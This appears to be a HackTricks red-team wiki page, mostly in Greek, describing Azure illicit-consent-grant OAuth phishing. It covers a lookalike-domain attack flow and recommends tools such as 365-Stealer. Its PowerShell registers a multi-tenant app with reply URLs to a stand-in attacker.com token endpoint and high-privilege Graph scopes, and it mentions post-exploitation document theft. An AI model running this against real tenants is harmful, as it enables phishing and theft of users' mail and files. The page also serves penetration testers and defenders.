# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Οι εφαρμογές Azure** ζητούν άδειες για να αποκτήσουν πρόσβαση στα **δεδομένα του χρήστη** (βασικές πληροφορίες, αλλά και πρόσβαση σε έγγραφα, αποστολή email...).\
Εάν **επιτραπεί**, ένας κανονικός χρήστης μπορεί να δώσει συγκατάθεση μόνο για **"Άδειες Χαμηλού Αντίκτυπου"**. Σε **όλες τις άλλες** περιπτώσεις, απαιτείται **συγκατάθεση διαχειριστή**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένας προσαρμοσμένος ρόλος που περιλαμβάνει `άδεια να δίνει άδειες σε εφαρμογές` μπορούν να παρέχουν συγκατάθεση σε επίπεδο ενοικιαστή.

Μόνο οι άδειες που **δεν απαιτούν συγκατάθεση διαχειριστή** ταξινομούνται ως **χαμηλού αντίκτυπου**. Αυτές είναι οι άδειες που απαιτούνται για **βασική σύνδεση είναι openid, profile, email, User.Read και offline\_access**. Εάν μια **οργάνωση** **επιτρέπει** τη συγκατάθεση χρηστών για **όλες τις εφαρμογές**, ένας υπάλληλος μπορεί να δώσει συγκατάθεση σε μια εφαρμογή για **να διαβάσει τα παραπάνω από το προφίλ του**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Επομένως, ένας επιτιθέμενος θα μπορούσε να προετοιμάσει μια **κακόβουλη εφαρμογή** και με μια **phishing**, να κάνει τον χρήστη **να αποδεχτεί την εφαρμογή και να κλέψει τα δεδομένα του**.

### 2 Τύποι Επιθέσεων Παράνομης Συγκατάθεσης

* **Μη Αυθεντικοποιημένη**: Από έναν εξωτερικό λογαριασμό δημιουργήστε μια εφαρμογή με τις άδειες `User.Read` και `User.ReadBasic.All`, για παράδειγμα, phishing ενός χρήστη, και θα μπορείτε να αποκτήσετε πρόσβαση σε πληροφορίες καταλόγου.
* Αυτό απαιτεί ο phished χρήστης να μπορεί να αποδεχτεί OAuth εφαρμογές από εξωτερικά περιβάλλοντα!
* **Αυθεντικοποιημένη**: Έχοντας παραβιάσει έναν κύριο με αρκετά προνόμια, δημιουργήστε μια εφαρμογή μέσα στον λογαριασμό και phishing κάποιου προνομιούχου χρήστη που μπορεί να αποδεχτεί προνομιούχες άδειες OAuth.
* Σε αυτή την περίπτωση μπορείτε ήδη να αποκτήσετε πρόσβαση στις πληροφορίες του καταλόγου, οπότε η άδεια `User.ReadBasic.All` δεν είναι πλέον ενδιαφέρουσα.
* Πιθανώς σας ενδιαφέρουν **άδειες που απαιτούν να τις δώσει ένας διαχειριστής**, επειδή ο απλός χρήστης δεν μπορεί να δώσει καμία άδεια σε OAuth εφαρμογές, γι' αυτό πρέπει να **phish μόνο αυτούς τους χρήστες** (περισσότερα σχετικά με ποιους ρόλους/άδειες δίνουν αυτό το προνόμιο αργότερα)

### Έλεγχος αν οι χρήστες επιτρέπεται να δώσουν συγκατάθεση

Η παρακάτω εντολή PowerShell χρησιμοποιείται για να ελέγξει τη ρύθμιση συγκατάθεσης για τους χρήστες στο Azure Active Directory (Azure AD) σχετικά με την ικανότητά τους να δίνουν συγκατάθεση σε εφαρμογές:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Απενεργοποίηση συγκατάθεσης χρηστών**: Αυτή η ρύθμιση απαγορεύει στους χρήστες να χορηγούν άδειες σε εφαρμογές. Δεν επιτρέπεται καμία συγκατάθεση χρηστών σε εφαρμογές.
* **Οι χρήστες μπορούν να συναινέσουν σε εφαρμογές από επαληθευμένους εκδότες ή την οργάνωσή σας, αλλά μόνο για τις άδειες που επιλέγετε**: Αυτή η ρύθμιση επιτρέπει σε όλους τους χρήστες να συναινέσουν μόνο σε εφαρμογές που δημοσιεύονται από επαληθευμένο εκδότη και σε εφαρμογές που είναι καταχωρημένες στο δικό σας tenant. Προσθέτει ένα επίπεδο ελέγχου επιτρέποντας τη συγκατάθεση μόνο για συγκεκριμένες άδειες.
* **Οι χρήστες μπορούν να συναινέσουν σε όλες τις εφαρμογές**: Αυτή η ρύθμιση είναι πιο επιεικής και επιτρέπει σε όλους τους χρήστες να συναινέσουν σε οποιεσδήποτε άδειες για εφαρμογές, εφόσον αυτές οι άδειες δεν απαιτούν διοικητική συγκατάθεση.
* **Πολιτική συγκατάθεσης προσαρμοσμένης εφαρμογής**: Αυτή η ρύθμιση υποδεικνύει ότι υπάρχει μια προσαρμοσμένη πολιτική, η οποία μπορεί να προσαρμοστεί σε συγκεκριμένες οργανωτικές απαιτήσεις και μπορεί να περιλαμβάνει έναν συνδυασμό περιορισμών με βάση τον εκδότη της εφαρμογής, τις άδειες που ζητά η εφαρμογή και άλλους παράγοντες.

## **Κατανόηση της Επίθεσης Illicit Consent Grant**

Σε μια επίθεση illicit consent grant, οι επιτιθέμενοι εξαπατούν τους τελικούς χρήστες να χορηγήσουν άδειες σε μια κακόβουλη εφαρμογή που είναι καταχωρημένη με το Azure. Αυτό γίνεται κάνοντάς την εφαρμογή να φαίνεται νόμιμη, οδηγώντας τα θύματα να κάνουν κλικ σε ένα κουμπί "Αποδοχή" χωρίς να το γνωρίζουν. Ως αποτέλεσμα, το Azure AD εκδίδει ένα διακριτικό στον ιστότοπο του επιτιθέμενου, επιτρέποντάς τους να έχουν πρόσβαση και να χειρίζονται τα δεδομένα του θύματος, όπως η ανάγνωση ή η αποστολή email και η πρόσβαση σε αρχεία, χωρίς να χρειάζονται οργανωτικό λογαριασμό.

## **Επισκόπηση Ροής Επίθεσης**

Η επίθεση περιλαμβάνει αρκετά βήματα που στοχεύουν σε μια γενική εταιρεία. Να πώς μπορεί να εξελιχθεί:

1. **Καταχώρηση Τομέα και Φιλοξενία Εφαρμογής**: Ο επιτιθέμενος καταχωρεί έναν τομέα που μοιάζει με αξιόπιστη ιστοσελίδα, για παράδειγμα, "safedomainlogin.com". Κάτω από αυτόν τον τομέα, δημιουργείται μια υποτομέας (π.χ., "companyname.safedomainlogin.com") για να φιλοξενήσει μια εφαρμογή σχεδιασμένη να καταγράφει κωδικούς εξουσιοδότησης και να ζητά διακριτικά πρόσβασης.
2. **Καταχώρηση Εφαρμογής στο Azure AD**: Ο επιτιθέμενος καταχωρεί μια Πολυ-Ενοικιαζόμενη Εφαρμογή στο Azure AD Tenant του, ονομάζοντάς την όπως η στοχευόμενη εταιρεία για να φαίνεται νόμιμη. Ρυθμίζει το Redirect URL της εφαρμογής να δείχνει στον υποτομέα που φιλοξενεί την κακόβουλη εφαρμογή.
3. **Ρύθμιση Αδειών**: Ο επιτιθέμενος ρυθμίζει την εφαρμογή με διάφορες άδειες API (π.χ., `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Αυτές οι άδειες, μόλις χορηγηθούν από τον χρήστη, επιτρέπουν στον επιτιθέμενο να εξάγει ευαίσθητες πληροφορίες εκ μέρους του χρήστη.
4. **Διανομή Κακόβουλων Συνδέσμων**: Ο επιτιθέμενος δημιουργεί έναν σύνδεσμο που περιέχει το client id της κακόβουλης εφαρμογής και τον μοιράζεται με στοχευόμενους χρήστες, εξαπατώντας τους να χορηγήσουν συγκατάθεση.

## **Χρήση Εργαλείων για την Επίθεση**

Η επίθεση μπορεί να διευκολυνθεί χρησιμοποιώντας εργαλεία όπως το [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Προετοιμασία πριν την Επίθεση:

Εάν ο επιτιθέμενος έχει κάποιο επίπεδο πρόσβασης σε έναν χρήστη στην οργανωμένη θύμα, μπορεί να ελέγξει αν η πολιτική της οργάνωσης επιτρέπει στον χρήστη να αποδεχτεί εφαρμογές:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Για να εκτελέσει την επίθεση, ο επιτιθέμενος θα χρειαστεί να δημιουργήσει μια **νέα εφαρμογή στο Azure Tenant του** (στην εγγραφή εφαρμογών), ρυθμισμένη με τις άδειες:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` είναι μέσα στο `Microsoft Graph` στις `Delegated permissions`. (Οι άδειες εφαρμογής θα χρειαστούν πάντα επιπλέον έγκριση).

* `User.ReadBasic.All` είναι η άδεια που θα σας επιτρέψει να **διαβάσετε πληροφορίες όλων των χρηστών** στην οργάνωση αν παραχωρηθεί.
* Θυμηθείτε ότι μόνο οι `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένας προσαρμοσμένος ρόλος που περιλαμβάνει `άδεια να παραχωρεί άδειες σε εφαρμογές` μπορούν να παρέχουν συγκατάθεση σε επίπεδο tenant. Έτσι, θα πρέπει να **phish έναν χρήστη με έναν από αυτούς τους ρόλους** αν θέλετε να εγκρίνει μια **εφαρμογή που απαιτεί έγκριση διαχειριστή**.

Μπορείτε επίσης να δημιουργήσετε μια εφαρμογή μέσω cli με: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Δείτε [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) για να μάθετε πώς να το ρυθμίσετε.

{% hint style="warning" %}
Σημειώστε ότι το αποκτηθέν **access token** θα είναι για το **graph endpoint** με τα scopes: `User.Read` και `User.ReadBasic.All` (οι ζητούμενες άδειες). Δεν θα μπορείτε να εκτελέσετε άλλες ενέργειες (αλλά αυτές είναι αρκετές για να **κατεβάσετε πληροφορίες σχετικά με όλους τους χρήστες** στην οργάνωση).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Μπορείτε επίσης να χρησιμοποιήσετε αυτό το εργαλείο για να εκτελέσετε αυτήν την επίθεση.

## Post-Exploitation

Μόλις αποκτήσετε πρόσβαση στον χρήστη, μπορείτε να κάνετε πράγματα όπως να κλέψετε ευαίσθητα έγγραφα και ακόμη και να ανεβάσετε έγγραφα με backdoor.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
